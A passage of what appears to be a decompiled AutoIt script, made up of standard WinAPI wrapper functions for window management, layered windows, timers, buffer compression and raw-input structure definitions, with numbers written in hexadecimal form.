                If (($iflag = 0x1) And $bdir) Or (($iflag = 0x2) And Not $bdir) Then
                    ContinueLoop
                EndIf
            EndIf
            $ivalidrow += 0x1
            $aret[$ivalidrow] = $acall[0x3]
            $aret[0x0]+= 0x1
        Next
        If Not $aret[0x0] Then Return SetError(0xc, 0x0, 0x0)
        __Inc($aret, + -1)
        Return $aret
    EndFunc    ; -> _WinAPI_DragQueryFileEx

    Func _WinAPI_DragQueryPoint($hdrop)
        Local $tpoint = DllStructCreate($TAGPOINT)
        Local $acall = DllCall("shell32.dll", "bool", "DragQueryPoint", "handle", $hdrop, "struct*", $tpoint)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $tpoint
    EndFunc    ; -> _WinAPI_DragQueryPoint

    Func _WinAPI_EndDeferWindowPos($hinfo)
        Local $acall = DllCall("user32.dll", "bool", "EndDeferWindowPos", "handle", $hinfo)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_EndDeferWindowPos

    Func _WinAPI_EnumChildWindows($hwnd, $BVISIBLE = True)
        If Not _WinAPI_GetWindow($hwnd, 0x5) Then Return SetError(0x2, 0x0, 0x0)
        Local $henumproc = DllCallbackRegister("__EnumWindowsProc", "bool", "hwnd;lparam")
        Dim $__g_venum[0x65][0x2] = [[0x0]]
        DllCall("user32.dll", "bool", "EnumChildWindows", "hwnd", $hwnd, "ptr", DllCallbackGetPtr($henumproc), "lparam", $BVISIBLE)
        If @error Or Not $__g_venum[0x0][0x0] Then
            $__g_venum = @error + 0xa
        EndIf
        DllCallbackFree($henumproc)
        If $__g_venum Then Return SetError($__g_venum, 0x0, 0x0)
        __Inc($__g_venum, + -1)
        Return $__g_venum
    EndFunc    ; -> _WinAPI_EnumChildWindows

    Func _WinAPI_FindWindow($sclassname, $swindowname)
        Local $acall = DllCall("user32.dll", "hwnd", "FindWindowW", "wstr", $sclassname, "wstr", $swindowname)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FindWindow

    Func _WinAPI_FlashWindow($hwnd, $binvert = True)
        Local $acall = DllCall("user32.dll", "bool", "FlashWindow", "hwnd", $hwnd, "bool", $binvert)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FlashWindow

    Func _WinAPI_FlashWindowEx($hwnd, $iflags = 0x3, $icount = 0x3, $itimeout = 0x0)
        Local $tflash = DllStructCreate($TAGFLASHWINFO)
        Local $iflash = DllStructGetSize($tflash)
        Local $imode = 0x0
        If BitAND($iflags, 0x1) <> 0x0 Then $imode = BitOR($imode, $FLASHW_CAPTION)
        If BitAND($iflags, 0x2) <> 0x0 Then $imode = BitOR($imode, $FLASHW_TRAY)
        If BitAND($iflags, 0x4) <> 0x0 Then $imode = BitOR($imode, $FLASHW_TIMER)
        If BitAND($iflags, 0x8) <> 0x0 Then $imode = BitOR($imode, $FLASHW_TIMERNOFG)
        DllStructSetData($tflash, "Size", $iflash)
        DllStructSetData($tflash, "hWnd", $hwnd)
        DllStructSetData($tflash, "Flags", $imode)
        DllStructSetData($tflash, "Count", $icount)
        DllStructSetData($tflash, "Timeout", $itimeout)
        Local $acall = DllCall("user32.dll", "bool", "FlashWindowEx", "struct*", $tflash)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_FlashWindowEx

    Func _WinAPI_GetAncestor($hwnd, $iflags = 0x1)
        Local $acall = DllCall("user32.dll", "hwnd", "GetAncestor", "hwnd", $hwnd, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetAncestor

    Func _WinAPI_GetClassInfoEx($sclass, $hinstance = 0x0)
        Local $stypeofclass = "wstr"
        If Not IsString($sclass) Then $stypeofclass = "ptr"
        Local $twndclassex = DllStructCreate($TAGWNDCLASSEX)
        Local $acall = DllCall("user32.dll", "bool", "GetClassInfoExW", "handle", $hinstance, $stypeofclass, $sclass, "struct*", $twndclassex)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $twndclassex
    EndFunc    ; -> _WinAPI_GetClassInfoEx

    Func _WinAPI_GetClassLongEx($hwnd, $iindex)
        Local $acall
        If @AutoItX64 Then
            $acall = DllCall("user32.dll", "ulong_ptr", "GetClassLongPtrW", "hwnd", $hwnd, "int", $iindex)
        Else
            $acall = DllCall("user32.dll", "dword", "GetClassLongW", "hwnd", $hwnd, "int", $iindex)
        EndIf
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetClassLongEx

    Func _WinAPI_GetClientHeight($hwnd)
        Local $trect = _WinAPI_GetClientRect($hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top")
    EndFunc    ; -> _WinAPI_GetClientHeight

    Func _WinAPI_GetClientWidth($hwnd)
        Local $trect = _WinAPI_GetClientRect($hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return DllStructGetData($trect, "Right") - DllStructGetData($trect, "Left")
    EndFunc    ; -> _WinAPI_GetClientWidth

    Func _WinAPI_GetDlgItem($hwnd, $iitemid)
        Local $acall = DllCall("user32.dll", "hwnd", "GetDlgItem", "hwnd", $hwnd, "int", $iitemid)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetDlgItem

    Func _WinAPI_GetForegroundWindow()
        Local $acall = DllCall("user32.dll", "hwnd", "GetForegroundWindow")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetForegroundWindow

    Func _WinAPI_GetGUIThreadInfo($ithreadid)
        Local Const $TAGGUITHREADINFO = "dword Size;dword Flags;hwnd hWndActive;hwnd hWndFocus;hwnd hWndCapture;hwnd hWndMenuOwner;hwnd hWndMoveSize;hwnd hWndCaret;struct rcCaret;long left;long top;lon" & _
            "g right;long bottom;endstruct"
        Local $tgti = DllStructCreate($TAGGUITHREADINFO)
        DllStructSetData($tgti, 0x1, DllStructGetSize($tgti))
        Local $acall = DllCall("user32.dll", "bool", "GetGUIThreadInfo", "dword", $ithreadid, "struct*", $tgti)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $aret[0xb]
        For $i = 0x0 To 0xa
            $aret[$i] = DllStructGetData($tgti, $i + 0x2)
        Next
        For $i = 0x9 To 0xa
            $aret[$i]-= $aret[$i + -2]
        Next
        Return $aret
    EndFunc    ; -> _WinAPI_GetGUIThreadInfo

    Func _WinAPI_GetLastActivePopup($hwnd)
        Local $acall = DllCall("user32.dll", "hwnd", "GetLastActivePopup", "hwnd", $hwnd)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        If $acall[0x0] = $hwnd Then Return SetError(0x1, 0x0, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetLastActivePopup

    Func _WinAPI_GetLayeredWindowAttributes($hwnd, ByRef $itranscolor, ByRef $itransgui, $bcolorref = False)
        $itranscolor = + -1
        $itransgui = + -1
        Local $acall = DllCall("user32.dll", "bool", "GetLayeredWindowAttributes", "hwnd", $hwnd, "INT*", $itranscolor, "byte*", $itransgui, "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, 0x0)
        If Not $bcolorref Then
            $acall[0x2] = Int(BinaryMid($acall[0x2], 0x3, 0x1) & BinaryMid($acall[0x2], 0x2, 0x1) & BinaryMid($acall[0x2], 0x1, 0x1))
        EndIf
        $itranscolor = $acall[0x2]
        $itransgui = $acall[0x3]
        Return $acall[0x4]
    EndFunc    ; -> _WinAPI_GetLayeredWindowAttributes

    Func _WinAPI_GetMessageExtraInfo()
        Local $acall = DllCall("user32.dll", "lparam", "GetMessageExtraInfo")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetMessageExtraInfo

    Func _WinAPI_GetShellWindow()
        Local $acall = DllCall("user32.dll", "hwnd", "GetShellWindow")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetShellWindow

    Func _WinAPI_GetTopWindow($hwnd)
        Local $acall = DllCall("user32.dll", "hwnd", "GetTopWindow", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetTopWindow

    Func _WinAPI_GetWindowDisplayAffinity($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "GetWindowDisplayAffinity", "hwnd", $hwnd, "dword*", 0x0)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x2]
    EndFunc    ; -> _WinAPI_GetWindowDisplayAffinity

    Func _WinAPI_GetWindowInfo($hwnd)
        Local $twindowinfo = DllStructCreate($TAGWINDOWINFO)
        DllStructSetData($twindowinfo, "Size", DllStructGetSize($twindowinfo))
        Local $acall = DllCall("user32.dll", "bool", "GetWindowInfo", "hwnd", $hwnd, "struct*", $twindowinfo)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $twindowinfo
    EndFunc    ; -> _WinAPI_GetWindowInfo

    Func _WinAPI_GetWindowPlacement($hwnd)
        Local $twindowplacement = DllStructCreate($TAGWINDOWPLACEMENT)
        DllStructSetData($twindowplacement, "length", DllStructGetSize($twindowplacement))
        Local $acall = DllCall("user32.dll", "bool", "GetWindowPlacement", "hwnd", $hwnd, "struct*", $twindowplacement)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $twindowplacement
    EndFunc    ; -> _WinAPI_GetWindowPlacement

    Func _WinAPI_IsChild($hwnd, $hwndparent)
        Local $acall = DllCall("user32.dll", "bool", "IsChild", "hwnd", $hwndparent, "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsChild

    Func _WinAPI_IsHungAppWindow($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "IsHungAppWindow", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsHungAppWindow

    Func _WinAPI_IsIconic($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "IsIconic", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsIconic

    Func _WinAPI_IsWindowUnicode($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "IsWindowUnicode", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsWindowUnicode

    Func _WinAPI_IsZoomed($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "IsZoomed", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsZoomed

    Func _WinAPI_KillTimer($hwnd, $itimerid)
        Local $acall = DllCall("user32.dll", "bool", "KillTimer", "hwnd", $hwnd, "uint_ptr", $itimerid)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_KillTimer

    Func _WinAPI_OpenIcon($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "OpenIcon", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_OpenIcon

    Func _WinAPI_PostMessage($hwnd, $imsg, $wparam, $lparam)
        Local $acall = DllCall("user32.dll", "bool", "PostMessage", "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_PostMessage

    Func _WinAPI_RegisterClass($twndclass)
        Local $acall = DllCall("user32.dll", "word", "RegisterClassW", "struct*", $twndclass)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RegisterClass

    Func _WinAPI_RegisterClassEx($twndclassex)
        Local $acall = DllCall("user32.dll", "word", "RegisterClassExW", "struct*", $twndclassex)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RegisterClassEx

    Func _WinAPI_RegisterShellHookWindow($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "RegisterShellHookWindow", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RegisterShellHookWindow

    Func _WinAPI_RegisterWindowMessage($smessage)
        Local $acall = DllCall("user32.dll", "uint", "RegisterWindowMessageW", "wstr", $smessage)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_RegisterWindowMessage

    Func _WinAPI_SendMessageTimeout($hwnd, $imsg, $wparam = 0x0, $lparam = 0x0, $itimeout = 0x3e8, $iflags = 0x0)
        Local $acall = DllCall("user32.dll", "lresult", "SendMessageTimeoutW", "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam, "uint", $iflags, "uint", $itimeout, "dword_ptr*", 0x0)
        If @error Then Return SetError(@error, @extended, + -1)
        If Not $acall[0x0] Then Return SetError(0xa, _WinAPI_GetLastError(), + -1)
        Return $acall[0x7]
    EndFunc    ; -> _WinAPI_SendMessageTimeout

    Func _WinAPI_SetClassLongEx($hwnd, $iindex, $inewlong)
        Local $acall
        If @AutoItX64 Then
            $acall = DllCall("user32.dll", "ulong_ptr", "SetClassLongPtrW", "hwnd", $hwnd, "int", $iindex, "long_ptr", $inewlong)
        Else
            $acall = DllCall("user32.dll", "dword", "SetClassLongW", "hwnd", $hwnd, "int", $iindex, "long", $inewlong)
        EndIf
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetClassLongEx

    Func _WinAPI_SetForegroundWindow($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "SetForegroundWindow", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetForegroundWindow

    Func _WinAPI_SetLayeredWindowAttributes($hwnd, $itranscolor, $itransgui = 0xff, $iflags = 0x3, $bcolorref = False)
        If $iflags = Default Or $iflags = '' Or $iflags < 0x0 Then $iflags = 0x3
        If Not $bcolorref Then
            $itranscolor = Int(BinaryMid($itranscolor, 0x3, 0x1) & BinaryMid($itranscolor, 0x2, 0x1) & BinaryMid($itranscolor, 0x1, 0x1))
        EndIf
        Local $acall = DllCall("user32.dll", "bool", "SetLayeredWindowAttributes", "hwnd", $hwnd, "INT", $itranscolor, "byte", $itransgui, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetLayeredWindowAttributes

    Func _WinAPI_SetMessageExtraInfo($lparam)
        Local $acall = DllCall("user32.dll", "lparam", "SetMessageExtraInfo", "lparam", $lparam)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetMessageExtraInfo

    Func _WinAPI_SetSysColors($velements, $vcolors)
        Local $bisearray = IsArray($velements), $biscarray = IsArray($vcolors)
        Local $ielementnum
        If Not $biscarray And Not $bisearray Then
            $ielementnum = 0x1
        ElseIf $biscarray Or $bisearray Then
            If Not $biscarray Or Not $bisearray Then Return SetError(+ -1, + -1, False)
            If UBound($velements) <> UBound($vcolors) Then Return SetError(+ -1, + -1, False)
            $ielementnum = UBound($velements)
        EndIf
        Local $telements = DllStructCreate("int Element[" & $ielementnum & "]")
        Local $tcolors = DllStructCreate("INT NewColor[" & $ielementnum & "]")
        If Not $bisearray Then
            DllStructSetData($telements, "Element", $velements, 0x1)
        Else
            For $x = 0x0 To $ielementnum + -1
                DllStructSetData($telements, "Element", $velements[$x], $x + 0x1)
            Next
        EndIf
        If Not $biscarray Then
            DllStructSetData($tcolors, "NewColor", $vcolors, 0x1)
        Else
            For $x = 0x0 To $ielementnum + -1
                DllStructSetData($tcolors, "NewColor", $vcolors[$x], $x + 0x1)
            Next
        EndIf
        Local $acall = DllCall("user32.dll", "bool", "SetSysColors", "int", $ielementnum, "struct*", $telements, "struct*", $tcolors)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetSysColors

    Func _WinAPI_SetTimer($hwnd, $itimerid, $ielapse, $ptimerfunc)
        Local $acall = DllCall("user32.dll", "uint_ptr", "SetTimer", "hwnd", $hwnd, "uint_ptr", $itimerid, "uint", $ielapse, "ptr", $ptimerfunc)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetTimer

    Func _WinAPI_SetWindowDisplayAffinity($hwnd, $iaffinity)
        Local $acall = DllCall("user32.dll", "bool", "SetWindowDisplayAffinity", "hwnd", $hwnd, "dword", $iaffinity)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetWindowDisplayAffinity

    Func _WinAPI_SetWindowLong($hwnd, $iindex, $ivalue)
        _WinAPI_SetLastError(0x0)
        Local $sfuncname = "SetWindowLongW"
        If @AutoItX64 Then $sfuncname = "SetWindowLongPtrW"
        Local $acall = DllCall("user32.dll", "long_ptr", $sfuncname, "hwnd", $hwnd, "int", $iindex, "long_ptr", $ivalue)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetWindowLong

    Func _WinAPI_SetWindowPlacement($hwnd, $twindowplacement)
        Local $acall = DllCall("user32.dll", "bool", "SetWindowPlacement", "hwnd", $hwnd, "struct*", $twindowplacement)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetWindowPlacement

    Func _WinAPI_ShowOwnedPopups($hwnd, $bshow)
        Local $acall = DllCall("user32.dll", "bool", "ShowOwnedPopups", "hwnd", $hwnd, "bool", $bshow)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShowOwnedPopups

    Func _WinAPI_SwitchToThisWindow($hwnd, $balttab = False)
        DllCall("user32.dll", "none", "SwitchToThisWindow", "hwnd", $hwnd, "bool", $balttab)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_SwitchToThisWindow

    Func _WinAPI_TileWindows($awnds, $trect = 0x0, $hparent = 0x0, $iflags = 0x0, $ISTART = 0x0, $IEND = + -1)
        If __CheckErrorArrayBounds($awnds, $ISTART, $IEND) Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $icount = $IEND - $ISTART + 0x1
        Local $twnds = DllStructCreate("hwnd[" & $icount & "]")
        $icount = 0x1
        For $i = $ISTART To $IEND
            DllStructSetData($twnds, 0x1, $awnds[$i], $icount)
            $icount += 0x1
        Next
        Local $acall = DllCall("user32.dll", "word", "TileWindows", "hwnd", $hparent, "uint", $iflags, "struct*", $trect, "uint", $icount + -1, "struct*", $twnds)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_TileWindows

    Func _WinAPI_UnregisterClass($sclass, $hinstance = 0x0)
        Local $stypeofclass = "wstr"
        If Not IsString($sclass) Then $stypeofclass = "ptr"
        Local $acall = DllCall("user32.dll", "bool", "UnregisterClassW", $stypeofclass, $sclass, "handle", $hinstance)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UnregisterClass

    Func _WinAPI_UpdateLayeredWindow($hwnd, $hdestdc, $tptdest, $tsize, $hsrcdc, $tptsrce, $irgb, $tblend, $iflags)
        Local $acall = DllCall("user32.dll", "bool", "UpdateLayeredWindow", "hwnd", $hwnd, "handle", $hdestdc, "struct*", $tptdest, "struct*", $tsize, "handle", $hsrcdc, "struct*", $tptsrce, "dword", $irgb, "struct*", $tblend, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UpdateLayeredWindow

    Func _WinAPI_UpdateLayeredWindowEx($hwnd, $ix, $iy, $hbitmap, $iopacity = 0xff, $bdelete = False)
        Local $acall = DllCall("user32.dll", "handle", "GetDC", "hwnd", $hwnd)
        Local $hdc = $acall[0x0]
        $acall = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
        Local $hdestdc = $acall[0x0]
        $acall = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hbitmap)
        Local $hdestsv = $acall[0x0]
        Local $tpoint
        If ($ix = + -1) And ($iy = + -1) Then
            $tpoint = DllStructCreate("int;int")
        Else
            $tpoint = DllStructCreate("int;int;int;int")
            DllStructSetData($tpoint, 0x3, $ix)
            DllStructSetData($tpoint, 0x4, $iy)
        EndIf
        DllStructSetData($tpoint, 0x1, 0x0)
        DllStructSetData($tpoint, 0x2, 0x0)
        Local $tblendfunction = DllStructCreate($TAGBLENDFUNCTION)
        DllStructSetData($tblendfunction, 0x1, 0x0)
        DllStructSetData($tblendfunction, 0x2, 0x0)
        DllStructSetData($tblendfunction, 0x3, $iopacity)
        DllStructSetData($tblendfunction, 0x4, 0x1)
        Local Const $TAGBITMAP = "struct;long bmType;long bmWidth;long bmHeight;long bmWidthBytes;ushort bmPlanes;ushort bmBitsPixel;ptr bmBits;endstruct"
        Local $tobj = DllStructCreate($TAGBITMAP)
        DllCall("gdi32.dll", "int", "GetObject", "handle", $hbitmap, "int", DllStructGetSize($tobj), "struct*", $tobj)
        Local $tsize = DllStructCreate($TAGSIZE, DllStructGetPtr($tobj, "bmWidth"))
        $acall = DllCall("user32.dll", "bool", "UpdateLayeredWindow", "hwnd", $hwnd, "handle", $hdc, "ptr", DllStructGetPtr($tpoint, 0x3), "struct*", $tsize, "handle", $hdestdc, "struct*", $tpoint, "dword", 0x0, "struct*", $tblendfunction, "dword", 0x2)
        Local $ierror = @error
        DllCall("user32.dll", "bool", "ReleaseDC", "hwnd", $hwnd, "handle", $hdc)
        DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hdestsv)
        DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hdestdc)
        If $ierror Then Return SetError($ierror, 0x0, False)
        If $bdelete Then
            DllCall("gdi32.dll", "bool", "DeleteObject", "handle", $hbitmap)
        EndIf
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UpdateLayeredWindowEx

    Func _WinAPI_UpdateLayeredWindowIndirect($hwnd, $tulwinfo)
        Local $acall = DllCall("user32.dll", "bool", "UpdateLayeredWindowIndirect", "hwnd", $hwnd, "struct*", $tulwinfo)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UpdateLayeredWindowIndirect

    Func _WinAPI_WindowFromPoint(ByRef $tpoint)
        Local $acall = DllCall("user32.dll", "hwnd", "WindowFromPoint", "struct", $tpoint)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_WindowFromPoint

#EndRegion Public Functions
#Region Internal Functions
    Func __EnumDefaultProc($pdata, $lparam)
        #forceref $lParam
        Local $ilength = _WinAPI_StrLen($pdata)
        __Inc($__g_venum)
        If $ilength Then
            $__g_venum[$__g_venum[0x0]] = DllStructGetData(DllStructCreate("wchar[" & ($ilength + 0x1) & "]", $pdata), 0x1)
        Else
            $__g_venum[$__g_venum[0x0]] = ''
        EndIf
        Return 0x1
    EndFunc    ; -> __EnumDefaultProc

#EndRegion Internal Functions
#Region Global Variables and Constants
    Global Const $TAGOSVERSIONINFOEX = $TAGOSVERSIONINFO & ";ushort ServicePackMajor;ushort ServicePackMinor;ushort SuiteMask;byte ProductType;byte Reserved"
    Global Const $TAGRAWINPUTDEVICE = "struct;ushort UsagePage;ushort Usage;dword Flags;hwnd hTarget;endstruct"
    Global Const $TAGRAWINPUTHEADER = "struct;dword Type;dword Size;handle hDevice;wparam wParam;endstruct"
    Global Const $TAGRAWMOUSE = "ushort Flags;ushort Alignment;ushort ButtonFlags;ushort ButtonData;ulong RawButtons;long LastX;long LastY;ulong ExtraInformation;"
    Global Const $TAGRAWKEYBOARD = "ushort MakeCode;ushort Flags;ushort Reserved;ushort VKey;uint Message;ulong ExtraInformation;"
    Global Const $TAGRAWHID = "dword SizeHid;dword Count;"
    Global Const $TAGRAWINPUTMOUSE = $TAGRAWINPUTHEADER & ";" & $TAGRAWMOUSE
    Global Const $TAGRAWINPUTKEYBOARD = $TAGRAWINPUTHEADER & ";" & $TAGRAWKEYBOARD
    Global Const $TAGRAWINPUTHID = $TAGRAWINPUTHEADER & ";" & $TAGRAWHID
    Global Const $TAGRID_DEVICE_INFO_MOUSE = "struct;dword Id;dword NumberOfButtons;dword SampleRate;int HasHorizontalWheel;endstruc"
    Global Const $TAGRID_DEVICE_INFO_KEYBOARD = "struct;dword KbType;dword KbSubType;dword KeyboardMode;dword NumberOfFunctionKeys;dword NumberOfIndicators;dword NumberOfKeysTotal;endstruct"
    Global Const $TAGRID_DEVICE_INFO_HID = "struct;dword VendorId;dword ProductId;dword VersionNumber;ushort UsagePage;ushort Usage;endstruc"
    Global Const $TAGRID_INFO_MOUSE = "dword Size;dword Type;" & $TAGRID_DEVICE_INFO_MOUSE & ";dword Unused[2];"
    Global Const $TAGRID_INFO_KEYBOARD = "dword Size;dword Type;" & $TAGRID_DEVICE_INFO_KEYBOARD
    Global Const $TAGRID_INFO_HID = "dword Size;dword Type;" & $TAGRID_DEVICE_INFO_HID & ";dword Unused[2]"
    Global Const $TAGUSEROBJECTFLAGS = "int Inherit;int Reserved;dword Flags"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_ActivateKeyboardLayout($hlocale, $iflag = 0x0)
        Local $acall = DllCall("user32.dll", "handle", "ActivateKeyboardLayout", "handle", $hlocale, "uint", $iflag)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ActivateKeyboardLayout

    Func _WinAPI_AddClipboardFormatListener($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "AddClipboardFormatListener", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_AddClipboardFormatListener

    Func _WinAPI_CallNextHookEx($hhook, $icode, $wparam, $lparam)
        Local $acall = DllCall("user32.dll", "lresult", "CallNextHookEx", "handle", $hhook, "int", $icode, "wparam", $wparam, "lparam", $lparam)
        If @error Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CallNextHookEx

    Func _WinAPI_CloseDesktop($hdesktop)
        Local $acall = DllCall("user32.dll", "bool", "CloseDesktop", "handle", $hdesktop)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CloseDesktop

    Func _WinAPI_CloseWindowStation($hstation)
        Local $acall = DllCall("user32.dll", "bool", "CloseWindowStation", "handle", $hstation)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CloseWindowStation

    Func _WinAPI_CompressBuffer($puncompressedbuffer, $iuncompressedsize, $pcompressedbuffer, $icompressedsize, $iformatandengine = 0x2)
        Local $acall, $pworkspace = 0x0, $ierror = 0x0
        Do
            $acall = DllCall("ntdll.dll", "uint", "RtlGetCompressionWorkSpaceSize", "ushort", $iformatandengine, "ulong*", 0x0, "ulong*", 0x0)
            If @error Or $acall[0x0] Then
                $ierror = @error + 0x14
                ExitLoop
            EndIf
            $pworkspace = __HeapAlloc($acall[0x2])
            If @error Then
                $ierror = @error + 0x64
                ExitLoop
            EndIf
            $acall = DllCall("ntdll.dll", "uint", "RtlCompressBuffer", "ushort", $iformatandengine, "struct*", $puncompressedbuffer, "ulong", $iuncompressedsize, "struct*", $pcompressedbuffer, "ulong", $icompressedsize, "ulong", 0x1000, "ulong*", 0x0, "ptr", $pworkspace)
            If @error Or $acall[0x0] Or Not $acall[0x7] Then
                $ierror = @error + 0x1e
                ExitLoop
            EndIf
        Until 0x1
        __HeapFree($pworkspace)
        If $ierror Then
            If IsArray($acall) Then
                Return SetError(0xa, $acall[0x0], 0x0)
            Else
                Return SetError($ierror, 0x0, 0x0)
            EndIf
        EndIf
        Return $acall[0x7]
    EndFunc    ; -> _WinAPI_CompressBuffer

    Func _WinAPI_ComputeCrc32($pmemory, $ilength)
        If _WinAPI_IsBadReadPtr($pmemory, $ilength) Then Return SetError(0x1, @extended, 0x0)
        Local $acall = DllCall("ntdll.dll", "dword", "RtlComputeCrc32", "dword", 0x0, "struct*", $pmemory, "int", $ilength)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ComputeCrc32

    Func _WinAPI_CreateDesktop($sname, $iaccess = 0x2, $iflags = 0x0, $iheap = 0x0, $tsecurity = 0x0)
        Local $acall
        If $iheap Then
